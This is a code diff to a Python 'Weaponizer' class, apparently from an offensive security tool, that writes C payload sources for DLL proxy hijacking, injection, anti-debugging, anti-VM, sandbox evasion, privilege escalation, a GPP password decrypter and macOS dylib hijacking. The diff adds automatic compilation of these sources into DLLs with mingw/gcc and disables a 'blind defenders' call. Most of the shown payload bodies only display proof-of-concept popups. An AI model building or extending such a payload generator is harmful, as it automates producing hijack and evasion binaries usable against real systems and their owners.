@@ -1,5 +1,6 @@
 import os
 import random
+import subprocess
 from colorama import Fore, Style
 class Weaponizer:
     """
@@ -578,14 +579,53 @@ static void _poc_popup(const char* msg){{
         """No prefix needed since it's already in a target-specific folder"""
         return filename
 
-    def _write_c(self, filename, content):
+    def _write_c(self, filename, content, compile_to_dll=False):
         self._ensure_output_dir()
         filename = self._get_prefixed_name(filename)
         path = os.path.join(self.output_dir, filename)
         with open(path, "w", encoding="utf-8") as f:
             f.write(content)
         print(f"  {Fore.MAGENTA}[GHOST-v3] {filename}{Style.RESET_ALL}")
+        
+        if compile_to_dll:
+            dll_path = path.replace(".c", ".dll")
+            self._auto_compile(path, dll_path)
+            
         return path
+
+    def _auto_compile(self, src_path, out_path, def_path=None):
+        """Tự động dò trình biên dịch và build mã độc"""
+        # 1. Thử tìm trình biên dịch chéo (Cross-compiler) cho Windows
+        compilers = ["x86_64-w64-mingw32-gcc", "i686-w64-mingw32-gcc", "gcc"]
+        target_compiler = None
+        
+        for c in compilers:
+            if subprocess.run(["which", c], capture_output=True).returncode == 0:
+                target_compiler = c
+                break
+        
+        if not target_compiler:
+            print(f"  {Fore.RED}[!] WARNING: Không tìm thấy trình biên dịch (gcc/mingw). Vui lòng cài đặt để Auto-Compile.{Style.RESET_ALL}")
+            return False
+
+        # 2. Xây dựng lệnh biên dịch
+        cmd = [target_compiler, "-shared", "-o", out_path, src_path]
+        if def_path:
+            cmd.append(def_path)
+        cmd.extend(["-luser32", "-lkernel32", "-ladvapi32"]) # Thư viện Windows cơ bản
+
+        # 3. Thực thi
+        try:
+            res = subprocess.run(cmd, capture_output=True, text=True)
+            if res.returncode == 0:
+                print(f"  {Fore.GREEN}[SUCCESS]  Auto-Compiled: {os.path.basename(out_path)}{Style.RESET_ALL}")
+                return True
+            else:
+                print(f"  {Fore.RED}[FAILURE]  Compile Error: {res.stderr[:200]}...{Style.RESET_ALL}")
+                return False
+        except Exception as e:
+            print(f"  {Fore.RED}[!] Lỗi hệ thống khi biên dịch: {str(e)}{Style.RESET_ALL}")
+            return False
 
     def _write_ps1(self, filename, content):
         self._ensure_output_dir()
@@ -630,9 +670,9 @@ static void _poc_popup(const char* msg){{
         core = self._ghost_core_c(dll_name)
         body = f"""
 void PayloadMain(void) {{
-    _blind_defenders();
+    // _blind_defenders(); // Optional
     _poc_popup(
-        "DLL PROXY HIJACK SUCCESS (GHOST-PROTOCOL v2)\\n"
+        "DLL PROXY HIJACK SUCCESS (GHOST-PROTOCOL v3)\\n"
         "Target : {dll_name}\\n"
         "Original moved to: {orig_dll}\\n\\n"
         "Vui long xem report APS de biet them chi tiet."
@@ -645,7 +685,12 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID reserved) {{
     return TRUE;
 }}
 """
-        self._write_c(f"proxy_{dll_name.replace('.dll','')}.c", core + body)
+        c_path = self._write_c(f"proxy_{dll_name.replace('.dll','')}.c", core + body)
+        
+        # 4. TỰ ĐỘNG BIÊN DỊCH VỚI FILE .DEF
+        dll_out_path = c_path.replace(".c", ".dll")
+        def_full_path = os.path.join(self.output_dir, def_fname)
+        self._auto_compile(c_path, dll_out_path, def_path=def_full_path)
 
         # .bat deployer
         exe_name = os.path.basename(self.target_name)
@@ -803,7 +848,7 @@ BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID p) {
     return TRUE;
 }
 """
-        self._write_c("t3_vec021_injection.c", core + body)
+        self._write_c("t3_vec021_injection.c", core + body, compile_to_dll=True)
         return True
 
     def _gen_t3_antidebug(self, finding):
@@ -829,7 +874,7 @@ BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID p) {
     return TRUE;
 }
 """
-        self._write_c("t3_vec022_antidebug.c", core + body)
+        self._write_c("t3_vec022_antidebug.c", core + body, compile_to_dll=True)
         return True
 
     def _gen_t3_antivm(self, finding):
@@ -856,7 +901,7 @@ BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID p) {
     return TRUE;
 }
 """
-        self._write_c("t3_vec023_antivm.c", core + body)
+        self._write_c("t3_vec023_antivm.c", core + body, compile_to_dll=True)
         return True
 
     def _gen_t3_kernel_interact(self, finding):
@@ -877,7 +922,7 @@ BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID p) {
     return TRUE;
 }
 """
-        self._write_c("t3_vec024_kernel.c", core + body)
+        self._write_c("t3_vec024_kernel.c", core + body, compile_to_dll=True)
         return True
 
     def _gen_t3_service_ctrl(self, finding):
@@ -920,7 +965,7 @@ BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID p) {
     return TRUE;
 }
 """
-        self._write_c("t3_vec026_privesc.c", core + body)
+        self._write_c("t3_vec026_privesc.c", core + body, compile_to_dll=True)
         return True
 
     def _gen_t3_network(self, finding):
@@ -963,7 +1008,7 @@ BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID p) {
     return TRUE;
 }
 """
-        self._write_c("t3_vec028_crypto.c", core + body)
+        self._write_c("t3_vec028_crypto.c", core + body, compile_to_dll=True)
         return True
 
     def _gen_t3_file_tamper(self, finding):
@@ -990,7 +1035,7 @@ BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID p) {{
     return TRUE;
 }}
 """
-        self._write_c("t3_vec029_filetamper.c", core + body)
+        self._write_c("t3_vec029_filetamper.c", core + body, compile_to_dll=True)
         return True
 
     def _gen_t3_thread_mgmt(self, finding):
@@ -1010,7 +1055,7 @@ BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID p) {
     return TRUE;
 }
 """
-        self._write_c("t3_vec030_thread_pool.c", core + body)
+        self._write_c("t3_vec030_thread_pool.c", core + body, compile_to_dll=True)
         return True
 
     def _gen_t3_native_syscall(self, finding):
@@ -1032,7 +1077,7 @@ BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID p) {
     return TRUE;
 }
 """
-        self._write_c("t3_vec024_syscall.c", core + body)
+        self._write_c("t3_vec024_syscall.c", core + body, compile_to_dll=True)
         return True
 
     def _gen_t3_reflective_stub(self, finding):
@@ -1046,7 +1091,7 @@ __declspec(dllexport) void ReflectiveLoader() {
 }
 BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID p) { return TRUE; }
 """
-        self._write_c("t3_vec026_reflective.c", core + body)
+        self._write_c("t3_vec026_reflective.c", core + body, compile_to_dll=True)
         return True
 
     def _gen_t3_iat_loader(self, finding):
@@ -1064,7 +1109,7 @@ BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID p) {
     return TRUE;
 }
 """
-        self._write_c("t3_vec028_iat_loader.c", core + body)
+        self._write_c("t3_vec028_iat_loader.c", core + body, compile_to_dll=True)
         return True
 
     # ==================================================================
@@ -1096,7 +1141,7 @@ BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID p) {{
     return TRUE;
 }}
 """
-        self._write_c(f"phantom_{dll_name.replace('.dll','')}.c", core + body)
+        self._write_c(f"phantom_{dll_name.replace('.dll','')}.c", core + body, compile_to_dll=True)
         return True
 
     def _gen_t4_knowndlls_bypass(self, finding):
@@ -1136,7 +1181,7 @@ BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID p) {
     return TRUE;
 }
 """
-        self._write_c("t4_vec034_delay_load.c", core + body)
+        self._write_c("t4_vec034_delay_load.c", core + body, compile_to_dll=True)
         return True
 
     def _gen_t4_safe_search_exploit(self, finding):
@@ -1383,7 +1428,7 @@ BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID p) {
     return TRUE;
 }
 """
-        self._write_c("t5_vec044_overlay.c", core + body)
+        self._write_c("t5_vec044_overlay.c", core + body, compile_to_dll=True)
         return True
 
     def _gen_t5_string_table(self, finding):
@@ -1430,7 +1475,7 @@ PIMAGE_TLS_CALLBACK tls_callbacks[] = { TlsCallback, NULL };
 
 BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID p) { return TRUE; }
 """
-        self._write_c("t6_vec053_tls_callback.c", core + body)
+        self._write_c("t6_vec053_tls_callback.c", core + body, compile_to_dll=True)
         return True
 
     def _gen_t6_oep_stub(self, finding):
@@ -1453,7 +1498,7 @@ BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID p) {
     return TRUE;
 }
 """
-        self._write_c("t6_vec055_oep_stub.c", core + body)
+        self._write_c("t6_vec055_oep_stub.c", core + body, compile_to_dll=True)
         return True
 
     def _gen_t6_packer_stub(self, finding):
@@ -1471,7 +1516,7 @@ BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID p) {
     return TRUE;
 }
 """
-        self._write_c("t6_vec052_packer_stub.c", core + body)
+        self._write_c("t6_vec052_packer_stub.c", core + body, compile_to_dll=True)
         return True
 
     def _gen_t6_anti_dump(self, finding):
@@ -1498,7 +1543,7 @@ BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID p) {
     return TRUE;
 }
 """
-        self._write_c("t6_vec055_anti_dump.c", core + body)
+        self._write_c("t6_vec055_anti_dump.c", core + body, compile_to_dll=True)
         return True
 
     # ==================================================================
@@ -1718,7 +1763,7 @@ int main(int argc, char* argv[]) {
     return 0;
 }
 """
-        self._write_c("t9_vec081_gpp_decrypter.c", c_code)
+        self._write_c("t9_vec081_gpp_decrypter.c", c_code, compile_to_dll=True)
         return True
 
     def _gen_t9_ad_delegation(self, finding):
@@ -1802,7 +1847,7 @@ BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID p) {
     return TRUE;
 }
 """
-        self._write_c("t9_vec084_driver_ioctl.c", core + body)
+        self._write_c("t9_vec084_driver_ioctl.c", core + body, compile_to_dll=True)
         return True
 
     def _gen_t9_kernel_comm(self, finding):
@@ -1829,7 +1874,7 @@ BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID p) {
     return TRUE;
 }
 """
-        self._write_c("t9_vec085_kernel_comm.c", core + body)
+        self._write_c("t9_vec085_kernel_comm.c", core + body, compile_to_dll=True)
         return True
 
     def _gen_t9_service_lpe(self, finding):
@@ -1891,7 +1936,7 @@ BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID p) {
     return TRUE;
 }
 """
-        self._write_c("t9_vec087_named_pipe.c", core + body)
+        self._write_c("t9_vec087_named_pipe.c", core + body, compile_to_dll=True)
         return True
 
     def _gen_t10_ransomware_sim(self, finding):
@@ -2059,7 +2104,7 @@ int main() {{
     return 0;
 }}
 """
-        return self._write_c("ui_shatter_poc.c", code)
+        return self._write_c("ui_shatter_poc.c", code, compile_to_dll=True)
 
     def _gen_t2_race_condition(self, finding):
         """APS-VEC-012: File System Race Condition (TOCTOU) PoC"""
@@ -2113,7 +2158,7 @@ int main() {
     return 0;
 }
 """
-        return self._write_c("smc_execution_poc.c", code)
+        return self._write_c("smc_execution_poc.c", code, compile_to_dll=True)
 
     def _gen_t6_entropy_stub(self, finding):
         """APS-VEC-051: High Entropy / Packed detection PoC"""
@@ -2149,7 +2194,7 @@ int main() {{
     return 0;
 }}
 """
-        return self._write_c("heavens_gate_poc.c", code)
+        return self._write_c("heavens_gate_poc.c", code, compile_to_dll=True)
 
     def _gen_t6_sandbox_evasion(self, finding):
         """APS-VEC-057: Advanced Sandbox Evasion PoC"""
@@ -2163,7 +2208,7 @@ int main() {
     return 0;
 }
 """
-        return self._write_c("sandbox_evasion_poc.c", code)
+        return self._write_c("sandbox_evasion_poc.c", code, compile_to_dll=True)
 
     def _gen_t6_rdtsc_check(self, finding):
         """APS-VEC-058: Instruction Timing (RDTSC) PoC"""
@@ -2180,7 +2225,7 @@ int main() {
     return 0;
 }
 """
-        return self._write_c("rdtsc_timing_poc.c", code)
+        return self._write_c("rdtsc_timing_poc.c", code, compile_to_dll=True)
 
     def _gen_t10_cve_alert(self, finding):
         """APS-VEC-100: 3rd Party CVE Alert/PoC"""
@@ -2191,7 +2236,7 @@ int main() {{
     return 0;
 }}
 """
-        return self._write_c("cve_vulnerability_alert.c", code)
+        return self._write_c("cve_vulnerability_alert.c", code, compile_to_dll=True)
 
     # ==================================================================
     #  GENERIC INDICATOR PAYLOAD (fallback)
@@ -2218,7 +2263,7 @@ BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID p) {{
 }}
 """
         fname = f"generic_{fid.replace('-', '_')}.c"
-        self._write_c(fname, core + body)
+        self._write_c(fname, core + body, compile_to_dll=True)
         return True
 
     # ==================================================================
@@ -2233,7 +2278,7 @@ static void MacPwn() {
     system("osascript -e 'display alert \"APS SECURITY BREACH\" message \"DyLib Hijacking Success!\"'");
 }
 """
-        self._write_c("macos_dylib_hijack.c", code)
+        self._write_c("macos_dylib_hijack.c", code, compile_to_dll=True)
         return True
 
     def _gen_macos_launchagent(self, finding=None):
